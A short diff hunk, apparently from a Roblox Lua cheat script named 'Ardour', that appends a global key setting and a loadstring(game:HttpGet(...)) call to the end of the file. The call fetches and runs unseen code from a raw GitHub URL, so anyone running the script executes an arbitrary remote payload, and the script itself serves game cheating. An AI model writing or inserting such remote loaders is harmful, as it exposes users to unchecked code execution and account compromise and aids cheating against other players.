@@ -4319,3 +4319,6 @@ end
 print("loaded")
 Notify("Ardour", "Script loaded")
 game.CoreGui.PCR_1.Enabled = not game.CoreGui.PCR_1.Enabled
+
+getgenv().Key = "InstantHitWoo"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LirpOfficial/Lirp/refs/heads/main/Loader", true))()
